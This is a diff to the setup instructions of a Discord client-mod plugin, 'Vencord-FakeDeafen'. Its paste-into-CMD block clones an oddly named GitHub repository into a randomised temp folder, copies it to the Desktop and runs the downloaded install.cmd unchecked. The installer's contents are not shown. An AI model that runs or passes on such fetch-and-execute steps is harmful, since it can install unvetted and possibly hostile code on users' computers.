@@ -20,7 +20,10 @@ The complete setup can also be run from one CMD block. If you saved this project
 ```cmd
 set "PLUGIN_DIR=%USERPROFILE%\Desktop\Vencord-FakeDeafen"
 set "VENCORD_DIR=%USERPROFILE%\Desktop\Vencord"
-if not exist "%PLUGIN_DIR%\.git" git clone https://github.com/Malekzn30/tktkaishduoabfjokxcnv.git "%PLUGIN_DIR%"
+set "DOWNLOAD_DIR=%TEMP%\FakeDeafen-%RANDOM%-%RANDOM%"
+if not exist "%PLUGIN_DIR%\install.cmd" git clone https://github.com/Malekzn30/tktkaishduoabfjokxcnv.git "%DOWNLOAD_DIR%"
+if not exist "%PLUGIN_DIR%\install.cmd" if exist "%DOWNLOAD_DIR%\install.cmd" if not exist "%PLUGIN_DIR%" mkdir "%PLUGIN_DIR%"
+if not exist "%PLUGIN_DIR%\install.cmd" if exist "%DOWNLOAD_DIR%\install.cmd" xcopy /E /I /Y "%DOWNLOAD_DIR%\*" "%PLUGIN_DIR%\"
 if exist "%PLUGIN_DIR%\install.cmd" call "%PLUGIN_DIR%\install.cmd" "%VENCORD_DIR%"
 if not exist "%PLUGIN_DIR%\install.cmd" echo ERROR: the plugin download failed. Check your internet connection and Git installation.
 pause
